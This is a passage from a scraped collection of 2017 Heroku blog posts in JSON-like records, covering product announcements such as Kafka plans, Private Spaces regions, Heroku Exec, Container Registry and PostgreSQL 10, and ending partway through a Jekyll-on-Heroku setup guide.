helping others build similar CLIs both through releasing cli-engine as a general purpose CLI framework, but also through guidelines taken from our Style Guide that we feel all CLIs should strive to meet. CLI ruby node go toolbelt", "date": "2017-08-15,"},
{"website": "Heroku", "title": "Best of the Blogs: A Heroku Community Tour", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/heroku-community-tour", "abstract": "Best of the Blogs: A Heroku Community Tour Posted by Jonan Scheffler September 13, 2017 Listen to this article Heroku is very fortunate to have a strong community of developers that are excited and passionate about our product. Every day we hear from customers who tell us how much easier Heroku has made their lives, and they frequently share stories about interesting technical projects we've helped them bring to life. Our customers love us, and we love them right back. Today we'll take a look at a few blog posts and applications from Heroku users that illustrate what makes our community so special. We hope you enjoy the tour. If you have Heroku stories of your own you'd like to share, we'd love to hear them ! Dynos Spinning Other Dynos with Heroku This article comes to us from Yoni Weisbrod , a JS & React Native developer from Ivy . Ivy makes a community and business management tool for interior designers. They ran into some challenges when their worker dynos started maxing out their memory while generating some particularly hefty internal reports. Yoni and team decided to create a couple of new workers named Julia and Winston (after the characters from 1984 ). They use their new workers to dynamically handle the increased load from their report generation tasks. Julia uses the Heroku API to spin up Winston whenever a new report needs to be generated, then adds the report job to Winston's queue. Winston generates the report on demand and spins back down when the mischief has been managed. The beauty of this solution is that Winston is only used for the exact period of time it takes to generate the report, and since Heroku prorates dyno usage to the second, Ivy only ends up paying for the time they need to get their reports. How to Create and Deploy a Telegram Bot Imagine you're chatting with a friend on Telegram and you're reminded of a hilarious cat video you want to share. Think of all the tedium you'll have to endure while you switch applications, search for the video, get a shareable link, switch back to Telegram, and finally paste the link. This is the 21st century! We shouldn't have to find our own videos. This sounds like the perfect use case for a bot. You can read all about building your own basic greeting bot in this article from Roman Gaponov , CEO and Co-Founder of the DjangoStars agile software development company from Kiev, Ukraine. Roman uses Python on Heroku with the Telegram Bots API to build a simple bot that replies with a distinct message based on the time of day. If you're interested in building the YouTube lookup bot described above, you'll be much closer after you've walked through the development process described in Roman's article. Have a look at the YouTube Data API to get the rest of the way there. Werewolf Helper App Gabriela Gonzalez , a software engineer at Kibo Commerce , is a fantastic digital artist and the creator of the Werewolf Helper app on Heroku. The Werwolf Game (also known as Mafia) was originally created by Dmitry Davidoff. It's a popular game among developer communities because it requires minimal setup and offers a unique experience every time you play it. Gabriela's beautiful site brings Werewolf to your online friends as well, with a shared deck online that allows you and your frenemies to play remotely over Skype or any other voice medium. Now you have no excuses not to bond remotely over terror under a full moon. Painless PostgreSQL + Django Eleanor Stribling brings us a well-written post detailing PostgreSQL setup for Django applications . When you first set up a new Django app, it uses SQLite by default. Because Heroku uses an ephemeral file system (and SQLite is a disk-backed database), it's very likely that you would lose data if you did manage to get SQLite to work on Heroku. Heroku is pretty good at warning you when we detect that you're attempting to use SQLite, so you're not likely to actually lose any data. If you'd like some more information about SQLite on Heroku, check out this devcenter article . community community tour heroku community tour", "date": "2017-09-13,"},
{"website": "Heroku", "title": "Kafka Everywhere: New Plans and Pricing for Apache Kafka on Heroku", "author": ["Rand Fitzpatrick"], "link": "https://blog.heroku.com/kafka-on-heroku-new-plans", "abstract": "Kafka Everywhere: New Plans and Pricing for Apache Kafka on Heroku Posted by Rand Fitzpatrick September 14, 2017 Listen to this article Event-driven architectures are on the rise, in response to fast-moving data and constellations of inter-connected systems. In order to support this trend, last year we released Apache Kafka on Heroku - a gracefully integrated, fully managed, and carefully optimized element of Heroku's platform that is the culmination of years of experience of running many hundreds of Kafka clusters in production and contributing code to the Kafka ecosystem. Today, we are excited to announce additional plans and pricing in our Kafka offering in order to make Apache Kafka more accessible, and to better support development, testing, and low volume production needs. Apache Kafka on Heroku: Now With More Flexibility and Speed Apache Kafka is a powerful, distributed streaming platform, and the dominant open source solution in managing high scale event streams.  Kafka enables you to easily design and implement architectures for many important use cases, such as elastic queuing, data pipelines & analytics, and microservices coordination. Apache Kafka on Heroku removes the complexity and cost of running Kafka, making its valuable resources available to a broad range of developers and applications. The new addition to our managed Kafka plans, Basic, is based on a robust multi-tenant Kafka architecture. Multi-tenancy provides for much faster access to Kafka, with new resources being available in a matter of seconds, rather than minutes, and a much more accessible price point. This allows us to better serve application creators needing Kafka configurations that are more suitable for development or staging, or as production environments that don't require the full capacity of a dedicated cluster (as provided in our existing Standard and Extended plans). Basic Standard Extended Cluster Shared Dedicated Dedicated Event Stream Volume Low High Massive Ideal Use Case Develop + Test, Low-Scale Production Production Production Price ($/month) $100+ $1,000+ $4,000+ These new multi-tenant plans allow for rapid creation of Kafka add-ons, easy integration into Heroku applications, and the world-class monitoring and tooling you have come to expect from Heroku. Get Started Today Using one of the new plans is as simple as provisioning an instance of the Kafka add-on and attaching it to a Heroku app: heroku addons:create heroku-kafka:basic-0 -a sushi-app We are excited to see what you build with Kafka! Full details of the new Kafka plans can be found in Heroku Elements and in Heroku Dev Center .  If you have any questions or feedback, please let us know at kafka@heroku.com . kafka events streams data multitenant", "date": "2017-09-14,"},
{"website": "Heroku", "title": "Announcing the Dublin, Ireland Region for Heroku Private Spaces", "author": ["Brett Goulder"], "link": "https://blog.heroku.com/private-spaces-dublin-region", "abstract": "Announcing the Dublin, Ireland Region for Heroku Private Spaces Posted by Brett Goulder September 26, 2017 Listen to this article We are excited to announce the Dublin region for Heroku Private Spaces is now generally available for Heroku Enterprise customers. Dublin joins the growing list of regions that Private Spaces supports: Sydney, Virginia, Oregon, Frankfurt, and Tokyo. With the Private Spaces Dublin region, organizations can build and deploy Heroku-style apps closer to their UK customers, reducing network latency and providing a better user experience. Heroku Private Spaces, available as part of Heroku Enterprise , is a network isolated group of apps and data services with a dedicated runtime environment, provisioned by Heroku in a geographic region you specify. With Spaces you can build modern apps with the powerful Heroku developer experience and get enterprise-grade secure network topologies. This enables your Heroku applications to securely connect to on-premise systems on your corporate network and other cloud services, including Salesforce. Usage To create a Private Space in Dublin, select the Spaces tab in Heroku Dashboard in Heroku Enterprise, then click the “New Space” button and choose “Dublin, Ireland” from the the Space Region dropdown. Or you can create the space in the CLI by running: $ heroku spaces:create my-new-space --region dublin --team my-team\nCreating space my-new-space in team my-team... done After a Private Space in Dublin is created, Heroku apps can be created inside it as normal. All of Heroku’s data add-ons, Postgres , Redis , and Kafka , are also available in Dublin as are a variety of third-party Add-ons . Conclusion All Heroku Enterprise customers can immediately begin to create Private Spaces in Dublin and deploy apps there. If there are regions which you would like us to support in the future, please let us know .", "date": "2017-09-26,"},
{"website": "Heroku", "title": "Heroku Exec and Language Runtime Metrics GA:  Runtime Debugging on Heroku  ", "author": ["Jon Byrum"], "link": "https://blog.heroku.com/heroku-exec-language-runtime-metrics-ga-runtime-debugging", "abstract": "Heroku Exec and Language Runtime Metrics GA:  Runtime Debugging on Heroku Posted by Jon Byrum September 28, 2017 Listen to this article We’ve all been there -- you push your code to production and a leak causes memory usage to grow out of control.  To determine the root cause of the problem, you need to be able to monitor, inspect, and debug the production application, collecting detailed data at runtime. Today we’re making it even easier to debug your applications on Heroku, with the general availability of Language Runtime Metrics , starting with JVM languages, and Heroku Exec .  Language metrics surfaces key indicators of an issue, like garbage collection activity, and heap and non-heap memory usage, on a unified timeline in the Heroku Dashboard. After you’ve identified an issue, you can use Exec to connect to a dyno at runtime, via SSH, for further inspection and remote debugging.  When combined with Application Metrics, Language Runtime Metrics and Exec provide a robust set of tools for maintaining production application health. Runtime Inspection with Exec: SSH to the Dyno When a problem arises, and you need to collect data at runtime, you can connect to a dyno via SSH with Exec: $ heroku ps:exec\nEstablishing credentials... done\nConnecting to web.1 on ⬢ ns-pipeline-staging... \n~ $ top Unlike heroku run bash , which creates a one-off dyno , Exec makes an SSH connection directly to an existing dyno (e.g., web.2).  Exec also allows you to copy files off of a dyno, forward traffic on a local port to a dyno, and take advantage of common Java debugging tools. Connecting a Remote Debugger & Java Tools While top and ps are great for debugging memory issues, sometimes you need to connect a remote debugger, such as Eclipse, IntelliJ or WebStorm, and step through code.  With Exec, you can forward traffic from a local port to a dyno, enabling you to connect your remote debugger. $ heroku ps:forward 5858 To see an example, check out the video above. For Java applications, you can use JVM-specific commands to emit jmap and jstack dumps.  Exec also offers the ability to connect JConsole and VisualVM to an application with one command. Monitoring Production Applications with Language Runtime Metrics Language metrics are displayed within the Application Metrics dashboard so you can easily correlate language runtime health to overall application health. Language runtime metrics uses the prometheus agent, which provides a lightweight method for gathering data. The additional metrics collection has minimal impact on application performance.  The initial release supports JVM languages, with additional languages in progress. We’d Love Your Feedback Exec and Language Runtime Metrics are now generally available and we have plans to extend our language-specific metrics and tools support beyond Java.  If you have feedback on either product, or want to share tools you would like us to support in the future, please let us know !", "date": "2017-09-28,"},
{"website": "Heroku", "title": "In the Cloud, No One Can Hear Your OutOfMemoryError", "author": ["Joe Kutner"], "link": "https://blog.heroku.com/in-the-cloud-no-one-can-hear-your-outofmemoryerror", "abstract": "In the Cloud, No One Can Hear Your OutOfMemoryError Posted by Joe Kutner October 02, 2017 Listen to this article Pushing an app to the cloud can feel like launching a probe into space. Once your project is thousands of miles away you can't bang on it with a hammer or replace broken parts when there's a problem. Your debugging efforts must rely on the instrumentation, telemetry, and remote controls included with the app when it was deployed. On Heroku, we've gladly done some of that prep work for you. Two new Heroku features, Heroku Exec and Language Runtime Metrics, improve your production monitoring, inspecting, and debugging experience on the platform. With Heroku Exec, you can create secure TCP and SSH tunnels into a dyno, which facilitate SSH sessions, port forwarding, remote debugging, and most popular diagnostic tools. Our Language Runtime Metrics feature supplements these tools by displaying detailed time series metrics in your Heroku dashboard. You can try Heroku Exec right now by running the following command on any Heroku app: $ heroku ps:exec\nEstablishing credentials... done\nConnecting to web.1 on ⬢ evening-lowlands-62983...\n~ $ This creates an SSH session into a running dyno, which makes it possible to inspect your application's Java process with commands like jstat and jcmd . To make this even easier, we've integrated the most popular tools, including jmap and VisualVM , directly into the Heroku CLI so you can run commands such as heroku java:jmap to get a heap dump from a dyno. Let's take a closer look at how you can use these features to debug real production problems by testing them on a Java application with a memory leak. Inspecting an App with the Heroku Java CLI You can follow the steps in this section with your own Java app running on Heroku, or you can use the sample app we've created, which includes a synthetic memory leak. You'll use the Heroku Java CLI to inspect the process with VisualVM and other diagnostic tools to identify the source of the leak. Make sure you have a Heroku account and have installed the Heroku CLI , then run the following commands to deploy the sample app: $ git clone https://github.com/kissaten/java-memory-leak\n$ cd java-memory-leak\n$ heroku create\n$ git push heroku master Open the app in a browser by running: $ heroku open The page will tell you exactly how much memory has been leaked, and it will grow each time you refresh. Unfortunately, most real-world leaks are not this polite, and must be uncovered with monitoring tools. The Java Development Kit (JDK) comes bundled with several of these tools, a few of which are integrated into the Heroku Java CLI. To start, install the Java CLI plugin by running this command: $ heroku plugins:install heroku-cli-java Now use the CLI to connect a local VisualVM session, a lightweight profiler for the Java virtual machine, to your remote Heroku dyno by running: $ heroku java:visualvm The command will create the connection and open VisualVM. You can see a demonstration in this video: Refresh your app's web page a few times. As the memory leak grows, you'll also see the process's heap memory grow in VisualVM. This helps you identify that the leak is confined to heap memory as opposed to off-heap memory. But it doesn't narrow down the objects at the source of the growth. For that, you can use the jmap command like this: $ heroku java:jmap --hprof\nEstablishing credentials... done\nGenerating heap dump for web.1 on ⬢ pure-tor-76648...\nDumping heap to /app/heapdump-5865f5e1-956a-4f60-8d66-8571b645a950.hprof ...\nHeap dump file created\nDownloading... ████████████████████████▏ 100% 00:00 This downloads a binary heap dump from the dyno, which can then be imported into tools like Eclipse Memory Analyzer (MAT) for analysis. Indeed, when you open the HPROF file in Eclipse MAT, its leak suspects report correctly identifies that the Servlet is holding on to some very large FakeLeak objects: Eclipse MAT, VisualVM, and jmap are great when you know you have a problem, but they are not tools you'll want to run continuously. For passive metrics monitoring, you need a low-overhead, zero-fuss solution. Monitoring a Production App with Heroku JVM Metrics The Heroku Language Runtime Metrics feature gathers detailed performance information from your application process and displays it in the Heroku Dashboard. This differs from our existing application metrics, which are gathered from the operating system and the Heroku platform. An application process's runtime can report more specific metrics, such as heap memory use and garbage collection activity, which provide better visibility into how your code is working. To enable this feature, you'll first need to upgrade to a paid, Standard or above, dyno. Then add the Heroku Metrics buildpack to your app by running the following commands: $ heroku buildpacks:add -i heroku/metrics Finally, make an empty commit to your application, and redeploy: $ git commit --allow-empty -m \"Add Heroku Metrics Buildpack\"\n$ git push heroku master Browse to the Heroku Dashboard for your application, and view the Metrics tab. Below the standard memory and dyno load charts, you'll see the JVM metrics: These charts display heap memory (memory used for each object your program creates), non-heap memory (which includes Metaspace and buffer pools ), and garbage collection activity. The metrics are reported by a small Java agent that Heroku attaches to your application process. This agent uses Prometheus , an open-source systems monitoring and alerting toolkit. We've chosen Prometheus because it's mature, has an active community, and is independent open-source project governed by the Cloud Native Computing Foundation. Heroku Language Metrics support for JVM languages is generally available, and support for Go is in beta. We'll have more languages coming soon. Bring Your Java Apps Down to Earth Your app may be physically running on servers in another country or continent, but that doesn't mean you have to forgo the tooling that helps you solve problems. We're lucky to have such excellent monitoring and debugging tools in the Java ecosystem, and at Heroku we're happy to make them easily available for you. For more information on the Heroku Java CLI, see the Heroku Exec article in Dev Center. For more information on JVM Runtime Metrics, see the Language Runtime Metrics article in Dev Center. java", "date": "2017-10-02,"},
{"website": "Heroku", "title": "Container Registry & Runtime GA: Deploy Docker Images to Heroku", "author": ["Jon Byrum"], "link": "https://blog.heroku.com/container-registry-and-runtime", "abstract": "Container Registry & Runtime GA: Deploy Docker Images to Heroku Posted by Jon Byrum October 03, 2017 Listen to this article In the last few years Docker has emerged as a de facto standard for packaging apps for deployment.  Today, Heroku Container Registry and Runtime is generally available, allowing you to deploy your Docker images directly to Heroku. With Container Registry, you get all of the benefits of Docker -- a great local development experience and flexibility to create your own stack -- with the benefits of running on Heroku: maintained infrastructure, container orchestration, routing, the leading add-ons ecosystem, and a world-class security & operations team. To deploy your Docker image to Heroku, simply run one command in the directory of your Dockerfile: $ heroku container:push web\n\n=== Building web\nStep 1 : FROM alpine:latest\n...\nSuccessfully built 74bab4bf0df3\n\n=== Pushing web\nThe push refers to a repository [registry.heroku.com/yourapp/web]\nc8821d626157: Pushed\n... Heroku Container Registry allows you to easily build your Docker image locally and deploy to Heroku.  Both Common Runtime and Private Spaces are supported. To get started, check out the Container Registry documentation . Use Docker to Develop Your Heroku App It can be especially frustrating when code that runs perfectly on your machine fails to run on another developer’s machine or a test/production environment.  To solve this problem, many development teams are adopting container technologies, like Docker, to fully isolate their app from the underlying OS and local environment. Docker is well-suited for local development, because a container that runs on your machine gives you confidence that it will also work on another developer’s machine.  As a Heroku developer you can now add Docker to your toolbelt and take advantage of the local development experience it provides.   When your code is ready, simply push the image directly to Heroku. Create Your Own Stack Traditionally, applications deployed on Heroku use a Ubuntu-based stack .  With Container Registry you can use any base image, such as Alpine .  You can also install any dependency, giving you choice in the stack that you run on Heroku. In this example Dockerfile, we use an Alpine image, install the Python runtime, as well as ImagicMagick from the apk package manager. # Grab the latest alpine image\nFROM alpine:latest\n\n# Install python runtime\nRUN apk --update add python3 py-pip py-gunicorn py-psycopg2 bash \n\n# Install ImageMagick\nRUN apk add imagemagick\n\n# Install dependencies\nADD ./python-getting-started/requirements.txt /tmp/requirements.txt\nRUN pip install -qr /tmp/requirements.txt\n\n# Add our code\nADD ./python-getting-started  /opt/webapp/\nWORKDIR /opt/webapp\n\n# Run the app.  CMD is required to run on Heroku            \nCMD gunicorn gettingstarted.wsgi --log-file - How Is Container Registry Different than git push heroku master ? When you run git push heroku master your app is built with a buildpack and runs on a Ubuntu-based stack, both of which are maintained by Heroku.  We provide a curated experience ensuring the OS, binaries, language runtime, and popular dependencies are up-to-date. By using Docker you get the flexibility of defining your own stack, plus the benefits of running on Heroku, such as maintained infrastructure, a security and SRE team, platform orchestration of containers & routing, and a robust ecosystem of add-on services.  It’s your stack to curate, backed by Heroku. We’re Just Getting Started Today, Container Registry and Runtime provides you with more choice; choice in tools you use to develop and choice in stack you use in your app.  And with Container Registry and Runtime, we’re just getting started; exciting new features for customizing your build are on the horizon.  If you have feedback about Container Registry, we’d love to hear from you: heroku-container-registry-feedback@salesforce.com . Docker container registry container runtime", "date": "2017-10-03,"},
{"website": "Heroku", "title": "PostgreSQL 10 Now Available in Beta on Heroku Postgres", "author": ["Camille Baldock"], "link": "https://blog.heroku.com/postgres-10-beta", "abstract": "PostgreSQL 10 Now Available in Beta on Heroku Postgres Posted by Camille Baldock October 17, 2017 Listen to this article Earlier this month, PostgreSQL 10.0 was released . Today, we are excited to announce PostgreSQL 10 is available in beta on Heroku, bringing a number of notable feature and performance improvements to our managed PostgreSQL database service. The beta provides customers who want to try out the new release an easy way to do so, while customers who are happy with the current version can continue to stay on version 9.6 until we make version 10 generally available. Also, new databases will continue to default to version 9.6 until we release version 10 to GA. While PostgreSQL 10 has many feature and performance benefits , we’d like to highlight several that we are most looking forward to: Performance Improvements Most Heroku Postgres users will notice a performance boost when using PostgreSQL 10 for certain types of queries. The introduction of improved parallel queries , which optimize common types of JOINs and table scans, will result in faster queries on many kinds of datasets. Additionally, the introduction of multivariate statistics objects enables users to significantly enhance query performance on any datasets which contain correlated data: STATISTICS objects can be used to let the query planner know about relationships within your data. This section of the PostgreSQL 10 manual explains the feature in more detail. Native Table Partitioning You may know we support table partitioning on previous PostgreSQL versions through the pg_partman extension which allows both time-based and serial-based table partition sets. By automatically segmenting data into seperate physical stores, Postgres table partitioning can be a great way to keep good query performance for very large tables. In PostgreSQL 10, users will have the option to leverage native table partitioning . PostgreSQL 10 native partitioning is possible by column but also by any arbitrary expression: in the following example we partition the users table by the first letter of a user's name. CREATE TABLE users (\n    id             serial not null,\n    name           text not null,\n    created_at     timestamptz not null\n)\nPARTITION BY RANGE ( LOWER( LEFT( name, 1 ) ) );\n\nCREATE TABLE users_0\n    partition of users (id, primary key (id), unique (name))\n    for values from ('a') to ('f');\n\nCREATE TABLE users_1\n    partition of users (id, primary key (id), unique (name))\n    for values from ('f') to ('z'); INSERT INTO users (name, created_at)\n    VALUES ('camille', now()),\n           ('greg', now());\n\nSELECT * FROM users_0;\nid |  name   |          created_at           \n----+---------+-------------------------------\n 1 | camille | 2017-10-13 18:45:17.882299+00\n(1 row)\n\nSELECT * FROM users_1;\n id | name |          created_at           \n----+------+-------------------------------\n  2 | greg | 2017-10-13 18:45:17.882299+00\n(1 row) You can find more information on PostgreSQL native partitioning and its limitations on the PostgreSQL wiki . Other improvements and features we are excited about include replicated hash indexes and transaction status checking . Getting Started and Caveats You can add a Postgres 10 instance via the CLI: heroku addons:create heroku-postgresql --version 10\n\nheroku pg:info DATABASE_URL\n=== DATABASE_URL\nPlan:                  Hobby-dev\nStatus:                Available\n...\nPG Version:            10.0\n... At present, all Heroku Postgres extensions - except for pg_partman, plv8 and redis_fdw - are supported while PostgreSQL 10 is in beta on Heroku. pg:backups is also supported on PostgreSQL 10. Additionally, pg:upgrade to PostgreSQL 10 is temporarily unavailable pending extension support and testing by our team. If you want to transfer data from your existing database, you can use pg:copy for now. Along with version 10 in beta, we currently support PostgreSQL versions 9.3, 9.4, 9.5 and 9.6 in GA. Once we gain confidence in this release through user testing and validation, we will make PostgreSQL 10 the default for all new databases on Heroku. Please contact us with any feedback, bugs, or questions at postgres@heroku.com . postgres sql database", "date": "2017-10-17,"},
{"website": "Heroku", "title": "Heroku Connect Update: Fast Writes, Global Deployment, and a Guided Management Experience", "author": ["Robert Zare"], "link": "https://blog.heroku.com/heroku-connect-update-fast-sync-global-regions", "abstract": "Heroku Connect Update: Fast Writes, Global Deployment, and a Guided Management Experience Posted by Robert Zare October 26, 2017 Listen to this article Today we are pleased to announce a significant update to Heroku Connect , one that is a culmination of two years of work to improve every aspect of the service. We’ve focused on three primary areas: improving write speed, geographically expanding the service, and intelligently guiding design and troubleshooting workflows. To that end, we’ve enabled bulk writes resulting in a 5x average increase in sync performance to Salesforce, deployed Connect in six global regions to be closer to customers’ databases, and built three guided management experiences that significantly increase user productivity. Collectively, these enhancements will enable Heroku Connect to continue to meet the ever increasing demands of enterprise customers. Enterprise Scale Data Integration We’ve been fortunate to see rapid adoption of Connect amongst our largest enterprise customers. Not surprisingly, these customers tend to have large amounts of data, complex data models, and very high expectations when it comes to performance. The set of features detailed below provide substantial increases in speed and resiliency of data synchronization. Fast Writes Undoubtedly our single most requested feature, bulk writes to Salesforce is now a reality. As of today, the feature is in public beta with opt-in available via a support request. In our testing we’ve observed 4-5x performance increases over the SOAP API. If you have a need to push large batches of updates to Salesforce, this is the only way to go. Resilient Writes One of the key benefits of Heroku Connect is its built-in knowledge of Salesforce; another key benefit is resiliency. The two come together in this feature, which automatically pauses and queues pending write operations anytime that Salesforce is unavailable (i.e., maintenance windows). Once connectivity is restored, changes are automatically sent over to Salesforce. No need for manual intervention or custom coding, it just works. Fast Reads Bulk API queries previously required a second, post-processing step to fetch and subsequently write foreign keys to related tables in Postgres. Heroku Connect can now do everything in a single pass and the result is a 5x reduction in overall time to fully complete bulk load operations. The more complex the data model, the more time will be saved. Global Deployment Connect is now deployed globally to each of our six Private Space regions: Dublin, Tokyo, Sydney, Frankfurt, Virginia, and Oregon. Not only does this enable addressing data isolation requirements, it provides a large performance increase in synchronization speed by virtue of being able to co-locate Heroku Postgres and Connect with Salesforce. Moving forward, this will form the foundation of our compliance-focused initiatives. Intelligently Guided Configuration Over the years we’ve observed that a significant percentage of Connect customer issues are rooted in suboptimal design decisions. When you consider how easy it is to setup Connect (be it correctly or incorrectly), in many cases these are literally day 0 decisions coming back to haunt  months later. Other times, the world changes around Connect, configurations become outdated, and errors begin to surface. Taken together, these high-level use cases represented a tremendous opportunity to improve the overall user experience across the full application lifecycle. Schema Change Detection Data models change - it’s a fact of life. Salesforce admins make changes to Salesforce objects. ORMs make changes, sometimes unexpectedly, to Postgres databases. Internally, we call this ‘schema drift’ and, as you might expect, changes to data types, lengths, and structure all have the potential to break synchronization. Heroku Connect will now detect schema changes and provide very specific reports to users, detailing precisely what changed and how. We can’t prevent change, nor would we want to, but we now make it easy to quickly and easily recover from unintended consequences. Connect Diagnose This feature provides an easy way to assess the health of your connections at runtime by way of of the new connect:diagnose command. The result is a robust set of well-documented checks against best practices and recommended design patterns delivered in a concise, easy to parse format. This is particularly useful when troubleshooting or filing support tickets. Here’s a sample of the Connect Diagnose output: Design Time Validations As the name implies, these are design-time checks, done in real-time, with the goal of making it easy to properly configure Connect. Each validation is backed by a dedicated section in our documentation that explains the issue and why you should care. Design Time Validations and Connect Diagnose work against a shared a repository of validation rules. The primary distinction between the two is when and how the validations are surfaced. Here’s an example of how we display validations in the user interface at design time: Learn More About Heroku Connect Today This update of Connect delivers a robust set of new features designed to meet the needs of enterprise customers. To learn more about Heroku Connect, checkout the Heroku Connect page and the Heroku Connect Elements listing. If you’re an existing customer and would like to participate in the bulk writes beta, let us know by visiting Heroku Help . connect data sync salesforce postgres", "date": "2017-10-26,"},
{"website": "Heroku", "title": "FY18 Q3 recap: New Private Spaces Dublin Region Support & Heroku Webhooks GA", "author": ["Arif Gursel"], "link": "https://blog.heroku.com/fy18-q3-recap-new-private-spaces-dublin-region-support-heroku-webhooks-ga", "abstract": "FY18 Q3 recap: New Private Spaces Dublin Region Support & Heroku Webhooks GA Posted by Arif Gursel October 27, 2017 Listen to this article Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: Heroku has expanded regions availability for Private Spaces and introduced the general availability of the Dublin region on September 26, 2017. Heroku users are able to run apps in all of the following Private Spaces regions: Virginia, Oregon, Frankfurt, Tokyo, Sydney, and Dublin. Please verify that your add-on's manifest accurately reflect the supported Privates Spaces regions. Heroku app webhooks for customers and add-on webhooks for partners are generally available . Partners are able to track many kinds of events relating to add-on resources on apps, domains, builds, releases, attachments, dynos, and more by implementing webhooks. Monthly partner payments and remittance reports are issued by the Salesforce Accounts Payable team and these are the official reports that should be referenced for final accounting numbers. The add-on revenues accrued from previous month’s close are distributed before end of the current month. Preliminary reporting in the partner portal, which is made available a few days after month’s close, does not take adjustments into account e.g. credits. addons partners partner portal webhooks integration api manifest password payments Private Spaces dublin", "date": "2017-10-27,"},
{"website": "Heroku", "title": "Announcing Heroku Private Space Peering for AWS", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/private-space-peering", "abstract": "Announcing Heroku Private Space Peering for AWS Posted by Jesper Joergensen November 01, 2017 Listen to this article Two years ago , we introduced Heroku Private Spaces as a new platform abstraction that combines powerful network isolation features with the seamless developer experience of Heroku. Today we are announcing Heroku Private Space Peering , a new capability to connect the isolated Private Space network to apps and services in Amazon VPCs controlled by you. Now you can build apps in Heroku that connect securely and privately to backend systems and workloads in AWS like a directory service, a search stack, a data warehouse, or a legacy SQL database. How It Works Private Space Peering is available to all Heroku Enterprise customers. Setting up a peering connection takes just a few simple actions. After you have initiated the peering connection on your Amazon VPC, it will show up in the list of peerings for your Private Space in the Dashboard Network tab: Heroku will automatically route dyno network traffic destined for your VPC network via the VPC connection ensuring that it never transits the public Internet. This allows you to expose your AWS hosted applications to Heroku apps without adding an Internet gateway and routing Internet traffic into your VPC. Similarly, you can securely connect Heroku apps to AWS services like Amazon RDS and Amazon Redshift that runs in VPCs. Peering based connectivity is guaranteed to please your network security team, shorten network review audits, and open up  new PaaS use cases that previously couldn't meet security requirements. Transforming to Cloud Native with Heroku and AWS By now, most IT organizations are executing projects to move existing workloads to the cloud and move to cloud native architectures like 12 Factor where possible. Heroku offers many benefits in terms of developer productivity, reduced operations complexity, and simplified governance. Some workloads are more complex and require more flexibility. Therefore, many organizations follow a pragmatic strategy of using both AWS and Heroku to transform IT. With Heroku Private Space Peering, dev teams can now build apps in Heroku that connect securely and privately to existing backend systems and workloads in AWS like a  directory service, a search stack, a data warehouse, or a legacy SQL database. Never before have IT teams had this kind of power and flexibility to modernize and optimize for agility without compromising security. Learn More If you’re attending Dreamforce, make sure to catch the Private Spaces session on Tuesday, November 7 at 430pm or stop by the Heroku booth. Or, if you’re attending AWS re:Invent come check out our joint technical session with AWS. For more information see the Heroku Private Spaces and VPC Peering Dev Center articles, or contact Heroku.", "date": "2017-11-01,"},
{"website": "Heroku", "title": "Announcing PCI Compliance for Heroku Shield", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/pci-compliance-for-heroku-shield", "abstract": "Announcing PCI Compliance for Heroku Shield Posted by Jesper Joergensen November 02, 2017 Listen to this article In June we announced Heroku Shield with new high compliance features for Heroku Private Spaces. Heroku Shield enables businesses like AlignTech to deploy apps that handle protected healthcare information (PHI) in accordance with government regulations. Today, we are proud to announce that Heroku Shield Services have been validated as PCI Level 1 Service Provider compliant. This designation helps our customers understand how Heroku's systems and human processes work together to safeguard customer data. It helps security and audit teams in choosing Heroku as a platform for running a company's most critical apps. Further Strengthening Trust with PCI The Payment Card Industry Data Security Standard (PCI DSS) is one of the most widely known, industry-defined security standards. It mandates explicit security controls and requires certified organizations to be audited by a qualified security assessor. The combination of rigor and broad adoption makes PCI a valuable tool for building trust between Heroku and our customers. The Security + Agility Challenge Growing a successful business and acquiring satisfied and trusting customers is a significant feat and is something to protect carefully. It is only natural that as a business grows, it becomes more risk averse. But when risk aversion leads to resistance to change  it creates another existential risk when the business is no longer adapting to the market. Businesses rely on Heroku to drive change. Heroku gives dev teams a way to rapidly evolve the customer experience while meeting complex compliance requirements around change control, OS system patching, access controls, encryption, intrusion detection,  business continuity and more. Heroku's platform acts as an interface between continuous delivery teams and centralized security and compliance functions that makes life easier for both. For example, when an app runs in a Shield Private Space, the security team knows that all access to production is keystroke logged and that vulnerable TLS protocols are not used, etc. No ongoing audit of the tooling or infrastructure is needed because no one had to build any tools or infrastructure. Code reviews and audits are simpler because the app code has to perform fewer security functions. Because production access can be safely granted to the dev team, developers can properly monitor their production applications, quickly diagnose bugs and performance problems, and deploy fixes right away. Learn More Come meet members of our security team at our Dreamforce technical session on Heroku Shield on Wednesday November 8 .  For more information on Heroku Shield Services and our approach to compliance, see the Dev Center article , or contact Heroku.", "date": "2017-11-02,"},
{"website": "Heroku", "title": "Jekyll on Heroku", "author": ["Caleb Hearth"], "link": "https://blog.heroku.com/jekyll-on-heroku", "abstract": "Jekyll on Heroku Posted by Caleb Hearth December 13, 2017 Listen to this article Jekyll , the static website generator written in Ruby and popularized by GitHub, is a great candidate for being run on Heroku. Originally built to run on GitHub Pages, running Jekyll on Heroku allows you to take advantage of Jekyll’s powerful plugin system to do more than convert Markdown to HTML. On my blog, I have plugins to download my Goodreads current and recently read books and to generate Open Graph images for posts. That said, it’s not straightforward to get up and running on Heroku without using jekyll serve to do the heavy lifting. jekyll serve uses Ruby’s built-in, single threaded web server WEBrick , but a public site should be using a web server more suited for production, like nginx. We’ll start from the very beginning. You’ll need Ruby and Bundler installed. I like ruby-install and chruby as my Ruby installer and switcher. This is the platform-agnostic way of installing the latest version of ruby-install. If you prefer, you can find instructions for OS X and Windows in ruby-install’s README . The commands below use the most recent versions of ruby-install and chruby available when this post was published. You probably want to use more recent versions if available. $ wget -O ruby-install-0.6.1.tar.gz https://github.com/postmodern/ruby-install/archive/v0.6.1.tar.gz\n$ tar -xzvf ruby-install-0.6.1.tar.gz\n$ cd ruby-install-0.6.1/\n$ sudo make install You’ll also want chruby, which you can similarly install in a more platform specific way using instructions in chruby’s README . $ wget -O chruby-0.3.9.tar.gz https://github.com/postmodern/chruby/archive/v0.3.9.tar.gz\n$ tar -xzvf chruby-0.3.9.tar.gz\n$ cd chruby-0.3.9/\n$ sudo make install Install the latest Ruby and use it: $ ruby-install ruby\n$ chruby ruby You’ll need Bundler and the Jekyll gem: $ gem install bundler jekyll\nFetching: bundler-1.9.9.gem (100%)\nSuccessfully installed bundler-1.9.9\nFetching: jekyll-3.6.2.gem (100%)\nSuccessfully installed jekyll-3.6.2\n2 gems installed Generating a new jekyll site is straightforward, and you get a site template 